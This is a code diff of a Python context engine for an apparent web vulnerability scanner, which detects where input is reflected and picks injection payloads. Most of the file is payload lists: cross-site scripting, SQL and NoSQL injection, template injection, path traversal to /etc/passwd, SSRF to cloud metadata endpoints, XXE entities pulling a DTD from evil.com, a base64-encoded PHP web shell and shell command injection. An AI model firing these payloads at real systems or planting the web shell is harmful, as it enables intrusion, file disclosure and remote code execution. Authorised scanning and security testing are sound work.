@@ -1,41 +1,76 @@
+# scanner/context_engine.py
+# ──────────────────────────────────────────────────────────────────────────────
+# CONTEXT ENGINE — Detects where user input lands in a response so the fuzzer
+# can select the highest-probability payload for that injection context.
+# Covers: HTML body, HTML attribute, JavaScript, JSON, URL, CSS, XML, PHP source.
+# ──────────────────────────────────────────────────────────────────────────────
+
 import re
+from scanner.fuzzer import (
+    XSS_PAYLOADS, SQLI_PAYLOADS, SSTI_PAYLOADS,
+    TRAVERSAL_PAYLOADS, CMDI_PAYLOADS, SSRF_PAYLOADS,
+)
 
 
 class ContextEngine:
-    """
-    Context-aware payload selection engine.
-    Detects where user input lands and chooses correct payloads.
-    """
-
-    HTML = "html"
+    # Context labels
+    HTML      = "html"
     ATTRIBUTE = "attribute"
-    JS = "javascript"
-    JSON = "json"
-    URL = "url"
-    UNKNOWN = "unknown"
+    JS        = "javascript"
+    JSON      = "json"
+    URL       = "url"
+    CSS       = "css"
+    XML       = "xml"
+    PHP       = "php_source"
+    UNKNOWN   = "unknown"
 
     def detect_context(self, response_text: str, marker: str) -> str:
-        if not response_text:
+        """
+        Determine the injection context by examining the text around the marker.
+        Returns one of the context label constants.
+        """
+        if not response_text or not marker:
             return self.UNKNOWN
 
         idx = response_text.find(marker)
-
         if idx == -1:
             return self.UNKNOWN
 
-        # small window around injection
-        window = response_text[max(0, idx - 120): idx + 120]
+        # Window: 200 chars before and 200 chars after the marker
+        window = response_text[max(0, idx - 200): idx + 200]
 
-        # JSON context
-        if re.search(r'"\s*:\s*".*' + re.escape(marker), window):
+        # PHP source context (wrapper / source disclosure)
+        if re.search(r'<\?php|\$_(GET|POST|REQUEST|SESSION|COOKIE)', window):
+            return self.PHP
+
+        # XML / XXE context
+        if re.search(r'<\?xml|<!DOCTYPE|<!\[CDATA\[', window):
+            return self.XML
+
+        # CSS context
+        if re.search(r'style\s*=|<style|@keyframes|\.css', window, re.IGNORECASE):
+            return self.CSS
+
+        # JSON context (inside a JSON value)
+        if re.search(r'"[^"]*' + re.escape(marker) + r'[^"]*"', window):
+            return self.JSON
+        if re.search(r':\s*".*' + re.escape(marker), window):
             return self.JSON
 
         # JavaScript context
-        if "<script" in window or "function(" in window:
+        if re.search(r'<script[^>]*>.*' + re.escape(marker), window, re.DOTALL | re.IGNORECASE):
+            return self.JS
+        if re.search(r'var\s+\w+\s*=|function\s*\(|=>\s*{', window):
             return self.JS
 
-        # Attribute context
-        if re.search(r'=\s*["\'].*' + re.escape(marker), window):
+        # URL context (href, src, action, data attributes)
+        if re.search(r'(href|src|action|data-url)\s*=\s*["\'][^"\']*' + re.escape(marker), window, re.IGNORECASE):
+            return self.URL
+
+        # HTML attribute context
+        if re.search(r'=\s*["\'][^"\']*' + re.escape(marker) + r'[^"\']*["\']', window):
+            return self.ATTRIBUTE
+        if re.search(r'\w+\s*=\s*' + re.escape(marker), window):
             return self.ATTRIBUTE
 
         # HTML body context
@@ -44,66 +79,106 @@ class ContextEngine:
 
         return self.UNKNOWN
 
-    def get_payloads(self, context: str):
-        # We use 'ctx' as a unique identifier for reflection tracking
+    def get_payloads(self, context: str) -> list:
+        """
+        Return the best payload list for a given injection context.
+        """
         payloads = {
             self.HTML: [
-                "<svg/onload=confirm(1)>",
-                "<details/open/ontoggle=confirm(1)>",
-                "<img src=x onerror=confirm(1)>",
-                # OAST/Out-of-band trigger (if OAST is active)
-                f"<img src='http://{self.marker}.oast.me/'>",
-                "javascript:confirm(1)"
+                "<script>alert(1)</script>",
+                "<img src=x onerror=alert(1)>",
+                "<svg/onload=alert(1)>",
+                "<details open ontoggle=alert(1)>",
+                "<body onload=alert(1)>",
+                "<iframe srcdoc='<script>alert(1)</script>'>",
             ],
 
             self.ATTRIBUTE: [
-                # Using autofocus to trigger without user interaction
-                '\" autofocus onfocus=confirm(1) x=\"',
-                '\' autofocus onfocus=confirm(1) y=\'',
-                # Event handler bypass for large-area elements
-                '\"/onmouseover=confirm(1)/style=display:block;width:1000px;height:1000px; \"'
+                '" onmouseover=alert(1) x="',
+                "' onfocus=alert(1) autofocus '",
+                '" onclick=alert(1) "',
+                '" onload=alert(1) "',
+                "' OR 1=1--",                       # SQLi can also live in attributes
+                "\" OR \"1\"=\"1",
             ],
 
             self.JS: [
-                # Polyglot to break out of single, double, or backtick strings
-                "'-confirm(1)-'",
-                "\"-confirm(1)-\"",
-                "`-confirm(1)-`",
-                # Breaking out of a block and commenting out the rest
-                "';confirm(1);//",
-                "');confirm(1);//",
-                "\"};confirm(1);//"
+                "';alert(1);//",
+                '";alert(1);//',
+                "`;alert(1)//",
+                "'-alert(1)-'",
+                "\\';alert(1);//",
+                # SQLi via JS fetch params
+                "' OR 1=1--",
+                # SSTI via JS template literals
+                "${7*7}",
             ],
 
             self.JSON: [
-                # Breaking JSON structures safely
-                '\"};confirm(1);//',
-                '\"}],\"a\":confirm(1)//',
-                '\"],\"b\":confirm(1),\"c\":[\"'
+                '"};</script><script>alert(1)//',
+                '{"$gt": ""}',                       # NoSQL injection
+                '{"$where": "1==1"}',
+                "' OR 1=1--",
+                "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
             ],
 
             self.URL: [
-                # SSRF Cloud & Local targets
-                "http://169.254.169.254/latest/meta-data/",
-                "http://metadata.google.internal/computeMetadata/v1/",
-                "http://127.0.0.1:80",
-                "http://localhost:22",
-                "gopher://127.0.0.1:6379/_SET%20test%20success"
+                "javascript:alert(1)",
+                "data:text/html,<script>alert(1)</script>",
+                "//evil.com",
+                "http://169.254.169.254/latest/meta-data/",  # SSRF via URL context
+                "file:///etc/passwd",
+                "http://127.0.0.1",
+            ],
+
+            self.CSS: [
+                "background-image:url('javascript:alert(1)')",
+                "expression(alert(1))",
+                "</style><script>alert(1)</script>",
+                "<style>@import 'http://evil.com/steal.css';</style>",
+            ],
+
+            self.XML: [
+                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><foo/>',
+            ],
+
+            self.PHP: [
+                "php://filter/convert.base64-encode/resource=index.php",
+                "php://filter/read=string.rot13/resource=../../config.php",
+                "php://input",
+                "expect://id",
+                "../../../etc/passwd",
+                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
             ],
 
             self.UNKNOWN: [
-                # Multi-purpose logic bombs
+                # Polyglot: works across HTML, JS, URL, attribute
+                "<script>alert(1)</script>",
                 "' OR 1=1--",
-                "\") OR 1=1--",
-                # Time-based blind detection (Postgres/MSSQL/MySQL)
-                "'; SELECT PG_SLEEP(5)--",
-                "'; WAITFOR DELAY '0:0:5'--",
-                # Command Injection (Unix/Win)
-                "& sleep 5 &",
-                "; sleep 5 ;",
-                "`sleep 5`"
-            ]
+                "{{7*7}}",
+                "../../../etc/passwd",
+                "; id",
+                "http://169.254.169.254",
+            ],
         }
 
-        # Fallback to UNKNOWN if context is not found
         return payloads.get(context, payloads[self.UNKNOWN])
+
+    def get_sqli_payloads_for_context(self, context: str) -> list:
+        """SQLi payloads tuned for the detected context."""
+        if context == self.JSON:
+            return [
+                '{"$gt": ""}',
+                '{"$where": "1==1"}',
+                "' OR 1=1--",
+                '", "password": "x" OR "1"="1',
+            ]
+        elif context in (self.URL, self.ATTRIBUTE):
+            return [
+                "' OR 1=1--",
+                "%27+OR+1%3D1--",
+                "'+OR+'1'%3D'1",
+            ]
+        else:
+            return SQLI_PAYLOADS
